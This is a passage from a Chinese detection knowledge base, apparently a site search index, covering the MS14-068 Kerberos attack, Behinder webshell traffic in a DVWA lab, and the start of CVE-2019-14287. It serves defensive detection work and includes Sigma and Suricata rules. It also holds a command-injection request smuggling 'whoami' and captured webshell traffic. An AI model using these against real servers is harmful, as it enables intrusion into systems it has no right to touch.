#\u7ba1\u7406\u5458\u767b\u5f55\n        Account Domain: '*.*' #\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM)\n    selection3:\n        EventID: 4768 #Kerberos TGS\u8bf7\u6c42\n        Supplied Realm Name: '*.*' #\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u4e3aABC.COM)\n    timeframe: last 5s\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_6","title":"\u5efa\u8bae","text":"<p>\u672c\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u68c0\u9a8c\uff0c\u8c28\u614e\u4f7f\u7528</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1212</p> <p>https://attack.mitre.org/techniques/T1212/</p> <p>\u5185\u7f51\u6e17\u900f\u4e4bPTH&amp;PTT&amp;PTK</p> <p>https://www.bbsmax.com/A/A7zgkjRPz4/</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/","title":"T1505-003-webshell-\u51b0\u874e","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Webshell\u662f\u4e00\u4e2aWeb\u811a\u672c\uff0c\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u7f51\u7edc\u7684\u7f51\u5173\u3002 Web shell\u53ef\u4ee5\u63d0\u4f9b\u591a\u79cd\u529f\u80fd\uff0c\u5982\u865a\u62df\u7ec8\u7aef\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWebshell\u53ef\u80fd\u8fd8\u6709\u4e00\u4e2a\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f\uff0c\u7528\u4e8e\u4e0e\u7ba1\u7406Web\u670d\u52a1\u5668\u7684\u901a\u4fe1\uff08\u4f8b\u5982\uff0c\u4e2d\u56fd\u83dc\u5200\u3001C\u5200\u3001\u8681\u5251\u3001\u51b0\u874e\u7b49\uff09\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>PHP\u7f51\u7ad9\uff08Phpstudy+DVWA\uff09</p> <p>\u51b0\u874eV1.0/V2.0\uff08\u5ba2\u6237\u7aef+\u81ea\u5e26shell\uff09</p> <p>wireshark\uff08\u5fc5\u5907\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP\u6d41\u91cf</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u5229\u7528DVWA\u76f8\u5173\u6f0f\u6d1e\uff0c\u4e0a\u4f20\u51b0\u874e\u9ed8\u8ba4webshell\uff0c\u5229\u7528\u51b0\u874e\u5ba2\u6237\u7aef\u5bf9webshell\u8fdb\u884c\u7ba1\u7406\uff0c\u6293\u53d6\u51b0\u874e\u5ba2\u6237\u7aef\u4e0eweb\u670d\u52a1\u5668\u4e0a\u7684\u811a\u672c\u4e4b\u95f4\u7684\u901a\u8baf\u6d41\u91cf\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#v10","title":"\u51b0\u874eV1.0","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#1","title":"1\uff09\u6b63\u5e38\u6d41\u91cf","text":"<p>GET\u8bf7\u6c42\u5305a</p> <p>GET /1.php HTTP/1.1</p> <p>Host: 192.168.66.136</p> <p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</p> <p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</p> <p>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p> <p>Accept-Encoding: gzip, deflate</p> <p>Referer: http://192.168.66.136/</p> <p>DNT: 1</p> <p>Connection: keep-alive</p> <p>Upgrade-Insecure-Requests: 1</p> <p>Cache-Control: max-age=0</p> <p>GET\u8bf7\u6c42\u8fd4\u56de\u5305a</p> <p>HTTP/1.1 200 OK</p> <p>Date: Tue, 20 Aug 2019 02:50:43 GMT</p> <p>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</p> <p>X-Powered-By: PHP/5.4.45</p> <p>Content-Length: 4</p> <p>Keep-Alive: timeout=5, max=100</p> <p>Connection: Keep-Alive</p> <p>Content-Type: text/html</p> <p>test</p> <p>POST\u8bf7\u6c42\u5305a</p> <p>POST /DVWA/vulnerabilities/exec/ HTTP/1.1</p> <p>Host: 192.168.66.136</p> <p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</p> <p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</p> <p>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p> <p>Accept-Encoding: gzip, deflate</p> <p>Content-Type: application/x-www-form-urlencoded</p> <p>Content-Length: 40</p> <p>DNT: 1</p> <p>Connection: keep-alive</p> <p>Referer: http://192.168.66.136/DVWA/vulnerabilities/exec/</p> <p>Cookie: security=low; PHPSESSID=190krorgsuckk0elaa1tk0v891</p> <p>Upgrade-Insecure-Requests: 1</p> <p>ip=127.0.0.1+%26%26+whoami&amp;Submit=Submit</p> <p>POST\u8fd4\u56de\u5305a</p> <p>HTTP/1.1 200 OK</p> <p>Date: Tue, 20 Aug 2019 02:52:47 GMT</p> <p>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</p> <p>X-Powered-By: PHP/5.4.45</p> <p>Expires: Tue, 23 Jun 2009 12:00:00 GMT</p> <p>Cache-Control: no-cache, must-revalidate</p> <p>Pragma: no-cache</p> <p>Content-Length: 5161</p> <p>Keep-Alive: timeout=5, max=100</p> <p>Connection: Keep-Alive</p> <p>Content-Type: text/html;charset=utf-8</p> <p>!DOCTYPE html PUBLIC \"-//W3C//DTD\uff08\u6b64\u5904\u7701\u7565\u66f4\u591a\u5b57\u7b26\u4fe1\u606f\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#2","title":"2\uff09\u51b0\u874e\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u6d41\u91cf","text":"<p>GET\u8bf7\u6c42\u5305</p> <pre><code>GET /shell.php?pass=1 HTTP/1.1\n\nUser-Agent: Java/1.8.0_211\n\nHost: 192.168.66.136\n\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\nConnection: keep-alive\n</code></pre> <p>GET\u8fd4\u56de\u5305</p> <p>HTTP/1.1 200 OK</p> <p>Date: Sun, 21 Jul 2019 02:51:55 GMT</p> <p>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</p> <p>X-Powered-By: PHP/5.4.45</p> <p>Set-Cookie: PHPSESSID=6dclf3mic9i86q7r6snpk34ef1; path=/</p> <p>Expires: Thu, 19 Nov 1981 08:52:00 GMT</p> <p>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</p> <p>Pragma: no-cache</p> <p>Content-Length: 16</p> <p>Keep-Alive: timeout=5, max=100</p> <p>Connection: Keep-Alive</p> <p>Content-Type: text/html</p> <p>f52eb8c003a3991b</p> <p>POST\u8bf7\u6c42\u5305</p> <pre><code>POST /shell.php HTTP/1.1\n\nContent-Type: application/octet-stream\n\nCookie: null;PHPSESSID=6dclf3mic9i86q7r6snpk34ef1; path=/\n\nCache-Control: no-cache\n\nPragma: no-cache\n\nUser-Agent: Java/1.8.0_211\n\nHost: 192.168.66.136\n\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\nConnection: keep-alive\n\nContent-Length: 1624\n\nD3dH8lwIFCCGYS9Yca  \uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09\n</code></pre> <p>POST\u8fd4\u56de\u5305</p> <p>HTTP/1.1 200 OK</p> <p>Date: Sun, 21 Jul 2019 02:51:55 GMT</p> <p>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</p> <p>X-Powered-By: PHP/5.4.45</p> <p>Expires: Thu, 19 Nov 1981 08:52:00 GMT</p> <p>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</p> <p>Pragma: no-cache</p> <p>Keep-Alive: timeout=5, max=99</p> <p>Connection: Keep-Alive</p> <p>Transfer-Encoding: chunked</p> <p>Content-Type: text/html</p> <p>1f4c0\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#3vs","title":"3\uff09\u6b63\u5e38\u6d41\u91cfVS\u51b0\u874e\u901a\u8baf\u6d41\u91cf","text":"<p>\u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\u51b0\u874eV1.0\u7248\u672c\u5728\u521d\u671f\u4ea4\u4e92\u901a\u8baf\u65f6\uff0c\u7279\u5f81\u8f83\u4e3a\u660e\u663e\uff0cuser-agent\u4e0e\u6b63\u5e38\u4e1a\u52a1\u6d41\u91cf\u660e\u663e\u4e0d\u540c\u3002\u53ef\u4ee5\u901a\u8fc7\u5bf9user-agent\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002\u5176\u6b21\u5728POST\u8fd4\u56de\u5305\u4e2d\u76f8\u5bf9\u6b63\u5e38\u6d41\u91cf\u591a\u4e86Transfer-Encoding: chunked\uff0cTransfer-Encoding\u4e3b\u8981\u662f\u7528\u6765\u6539\u53d8\u62a5\u6587\u683c\u5f0f\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u5229\u7528\u5206\u5757\u8fdb\u884c\u4f20\u8f93\u3002\u4f60\u53ef\u4ee5\u57fa\u4e8e\u6b64\u7279\u5f81\u503c\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u6bd4\u5982url\u4e2d\u5305\u542b.php?pass=\u6765\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#v21","title":"\u51b0\u874eV2.1","text":"<p>\u4ece\u51b0\u874eV1.1\u5f00\u59cb\u65b0\u589e\u968f\u673aUserAgent\u652f\u6301\uff0c\u6bcf\u6b21\u4f1a\u8bdd\u4f1a\u4ece17\u79cd\u5e38\u89c1UserAgent\u4e2d\u968f\u673a\u9009\u53d6\u3002\u51b0\u874e\u6700\u65b0\u7248\u672c\u4e3aV2.1\uff0c\u53ef\u4ee5\u901a\u8fc7\u5bf92.1\u7248\u672c\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u7684\u901a\u4fe1\u6d41\u91cf\uff0c\u8fdb\u884c\u6355\u83b7\uff0c\u5bf9\u6bd4\u6b63\u5e38\u6d41\u91cf\u8fdb\u884c\u5206\u6790\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#1a","title":"1\uff09\u6b63\u5e38\u6d41\u91cfa","text":"<p>GET\u8bf7\u6c42\u5305a</p> <p>\u540c\u51b0\u874eV1.0\u7ae0\u8282</p> <p>GET\u8bf7\u6c42\u8fd4\u56de\u5305a</p> <p>\u540c\u51b0\u874eV1.0\u7ae0\u8282</p> <p>POST\u8bf7\u6c42\u5305a</p> <p>\u540c\u51b0\u874eV1.0\u7ae0\u8282</p> <p>POST\u8fd4\u56de\u5305a</p> <p>\u540c\u51b0\u874eV1.0\u7ae0\u8282</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#2a","title":"2\uff09\u51b0\u874e\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u6d41\u91cfa","text":"<p>GET\u8bf7\u6c42\u5305a</p> <pre><code>GET /DVWA/hackable/uploads/shell.php?pass=673 HTTP/1.1\n\nContent-type: application/x-www-form-urlencoded\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)\n\nHost: 192.168.66.136\n\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\nConnection: keep-alive\n\n**GET\u8bf7\u6c42\u8fd4\u56de\u5305**a\n\nHTTP/1.1 200 OK\n\nDate: Mon, 19 Aug 2019 09:34:36 GMT\n\nServer: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45\n\nX-Powered-By: PHP/5.4.45\n\nSet-Cookie: PHPSESSID=m0agat42tmo0i4srnda5ssfq94; path=/\n\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\n\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\n\nPragma: no-cache\n\nContent-Length: 16\n\nKeep-Alive: timeout=5, max=100\n\nConnection: Keep-Alive\n\nContent-Type: text/html\n\n03befc81cbefda94\n</code></pre> <p>POST\u8bf7\u6c42\u5305</p> <pre><code>POST /DVWA/hackable/uploads/shell.php HTTP/1.1\n\nContent-Type: application/x-www-form-urlencoded\n\nCookie: PHPSESSID=bv5lv0681hq09ggt8rfj1peio5; path=/\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)\n\nCache-Control: no-cache\n\nPragma: no-cache\n\nHost: 192.168.66.136\n\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\nConnection: keep-alive\n\nContent-Length: 2220\n\nltEi32XJreSl8Y5Hhzk08Wgjfe8bLPr3x8n4qlJ\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09\n</code></pre> <p>POST\u8fd4\u56de\u5305</p> <p>HTTP/1.1 200 OK</p> <p>Date: Mon, 19 Aug 2019 09:34:36 GMT</p> <p>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</p> <p>X-Powered-By: PHP/5.4.45</p> <p>Expires: Thu, 19 Nov 1981 08:52:00 GMT</p> <p>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</p> <p>Pragma: no-cache</p> <p>Keep-Alive: timeout=5, max=97</p> <p>Connection: Keep-Alive</p> <p>Transfer-Encoding: chunked</p> <p>Content-Type: text/html</p> <p>21dc0gfUOcrBcH7jint5L0pmkDxT5ypIbjLnIsXnDxHGjofQk3g\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#3vsa","title":"3\uff09\u6b63\u5e38\u6d41\u91cfVS\u51b0\u874e\u901a\u8baf\u6d41\u91cfa","text":"<p>\u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u770b\u5230\uff0c\u51b0\u874eV2.1\u5728\u521d\u671f\u4ea4\u4e92\u901a\u8baf\u65f6\u6d41\u91cf\u4e2d\u591a\u4e86Transfer-Encoding: chunked\uff0cTransfer-Encoding\u4e3b\u8981\u662f\u7528\u6765\u6539\u53d8\u62a5\u6587\u683c\u5f0f\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u5229\u7528\u5206\u5757\u8fdb\u884c\u4f20\u8f93\u3002\u4f60\u53ef\u4ee5\u57fa\u4e8e\u6b64\u7279\u5f81\u503c\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u6bd4\u5982url\u4e2d\u5305\u542b.php?pass=\u6765\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_5","title":"\u68c0\u6d4b\u7279\u5f81/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#v10a","title":"\u51b0\u874eV1.0a","text":"<p>\u57fa\u4e8eGET\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aurl\u5305\u542b.php?pass=\uff0cuseragent\u5305\u542bJava/*\uff1b</p> <p>\u57fa\u4e8ePOST\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1auseragent\u5305\u542bJava/* \uff0c\u8fd4\u56de\u5305\u5305\u542b\uff1aTransfer-Encoding: chunked\uff1b</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#v21a","title":"\u51b0\u874eV2.1a","text":"<p>\u57fa\u4e8eGET\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aurl\u5305\u542b.php?pass=\uff1b\uff08\u5982\u679c\u4e0e\u4e1a\u52a1\u51b2\u7a81\uff0c\u8bef\u62a5\u8f83\u5927\uff09</p> <p>\u57fa\u4e8ePOST\u8fd4\u56de\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aTransfer-Encoding: chunked\uff1b</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1505-003</p> <p>https://attack.mitre.org/techniques/T1505/003/</p> <p>\u51b0\u874e\u4e0b\u8f7d\u5730\u5740</p> <p>https://github.com/rebeyond/Behinder/releases</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/","title":"T1505-003-webshell-\u51b0\u874e","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Webshell\u662f\u4e00\u4e2aWeb\u811a\u672c\uff0c\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u7f51\u7edc\u7684\u7f51\u5173\u3002 Web shell\u53ef\u4ee5\u63d0\u4f9b\u591a\u79cd\u529f\u80fd\uff0c\u5982\u865a\u62df\u7ec8\u7aef\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWebshell\u53ef\u80fd\u8fd8\u6709\u4e00\u4e2a\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f\uff0c\u7528\u4e8e\u4e0e\u7ba1\u7406Web\u670d\u52a1\u5668\u7684\u901a\u4fe1\uff08\u4f8b\u5982\uff0c\u4e2d\u56fd\u83dc\u5200\u3001C\u5200\u3001\u8681\u5251\u3001\u51b0\u874e\u7b49\uff09\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0\uff0c\u53ef\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\uff1b</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP\u6d41\u91cf</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\uff0c\u5efa\u8bae\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\uff1b</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u5efa\u8bae\u672c\u5730\u81ea\u884c\u6d4b\u8bd5\uff0c\u6293\u53d6\u6d41\u91cf\u6570\u636e\uff1b</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#suricata","title":"suricata\u89c4\u5219","text":"<p>\u53c2\u8003\u6765\u6e90\uff1ahttps://github.com/suricata-rules/suricata-rules/tree/master/Behinder</p> <pre><code>alert http any any -&gt; any any  (msg: \"Behinder3 PHP HTTP Request\"; flow: established, to_server; content:\".php\"; http_uri;  pcre:\"/[a-zA-Z0-9+/]{1000,}=/i\"; flowbits:set,behinder3;noalert; classtype:shellcode-detect; sid: 3016017; rev: 1; metadata:created_at 2020_08_17,by al0ne;)\nalert http any any -&gt; any any (msg: \"Behinder3  PHP HTTP Response\"; flow: established,to_client; content:\"200\"; http_stat_code; flowbits: isset,behinder3; pcre:\"/[a-zA-Z0-9+/]{100,}=/i\"; classtype:shellcode-detect; sid: 3016018; rev: 1; metadata:created_at 2020_08_17,by al0ne;)\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_6","title":"\u81ea\u5b9a\u4e49\u68c0\u6d4b\u89c4\u5219","text":"<pre><code>\u81ea\u5b9a\u4e49\u89c4\u5219\u8fdb\u884c\u9632\u62a4\uff1a(uri_path * rco \\.(jsp|jspx|php)$)&amp;&amp;(method * belong POST)&amp;&amp;(request_body * req ^[\\w+/]{1000,}=?=?$)\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_7","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1505-003</p> <p>https://attack.mitre.org/techniques/T1505/003/</p> <p>\u51b0\u874e3.0\u6d41\u91cf\u7279\u5f81\u5206\u6790\u9644\u7279\u5f81</p> <p>https://mp.weixin.qq.com/s/XMLK5OCpH9pICD9EL9nugA</p> <p>\u51b0\u874e\u7684\u524d\u4e16\u4eca\u751f:3.0\u65b0\u7248\u672c\u4e0b\u7684\u4e00\u4e9b\u9632\u62a4\u601d\u8003</p> <p>https://mp.weixin.qq.com/s/WYM3J3daMTFODr4BSkKzxg</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/","title":"T1548-003-linux-CVE-2019-14287","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>sudoers\u6587\u4ef6<code>/etc/sudoers</code>\u63cf\u8ff0\u4e86\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u8fd0\u884c\u54ea\u4e9b\u547d\u4ee4\u4ee5\u53ca\u4ece\u54ea\u4e9b\u7ec8\u7aef\u8fd0\u884c\u3002\u8fd9\u8fd8\u63cf\u8ff0\u4e86\u7528\u6237\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u7528\u6237\u6216\u7ec4\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u8fd9\u63d0\u4f9b\u4e86\u6700\u5c0f\u7279\u6743\u7684\u6982\u5ff5\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u5927\u591a\u6570\u65f6\u95f4\u4ee5\u6700\u4f4e\u53ef\u80fd\u7684\u6743\u9650\u8fd0\u884c\uff0c\u5e76\u4e14\u4ec5\u5728\u9700\u8981\u65f6\u63d0\u5347\u5230\u5176\u4ed6\u7528\u6237\u6216\u6743\u9650\uff0c\u901a\u5e38\u901a\u8fc7\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u4f46\u662f\uff0csudoers\u6587\u4ef6\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4f55\u65f6\u4e0d\u63d0\u793a\u7528\u6237\u8f93\u5165\u7c7b\u4f3c<code>user1 ALL=(ALL) NOPASSWD: ALL</code> [1]\u7684\u884c\u7684\u5bc6\u7801\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>CVE-2019-14287_</p> <p>\u5982\u679c\u5c06sudo\u914d\u7f6e\u4e3a\u5141\u8bb8\u7528\u6237\u901a\u8fc7Runas\u89c4\u8303\u4e2d\u5b9a\u4e49\u7684ALL\u5173\u952e\u5b57\u6765\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\u7684\u8bdd\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c06\u6709\u53ef\u80fd\u901a\u8fc7\u5236\u5b9a\u7528\u6237ID -1\u62164294967295\u6765\u4ee5root\u6743\u9650\u6267\u884c\u6076\u610f\u547d\u4ee4\u3002</p> <p>\u5f53sudo\u88ab\u914d\u7f6e\u4e3a 